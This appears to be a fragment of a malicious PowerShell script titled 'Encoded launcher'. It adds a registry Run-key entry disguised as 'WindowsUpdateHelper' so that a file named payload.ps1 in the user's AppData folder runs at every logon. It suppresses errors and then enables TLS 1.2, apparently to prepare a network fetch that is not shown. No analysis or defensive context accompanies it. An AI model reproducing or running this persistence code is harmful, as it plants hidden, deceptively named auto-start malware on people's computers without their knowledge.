# Encoded launcher
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\payload.ps1" + '"') -Force -ErrorAction SilentlyContinue
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
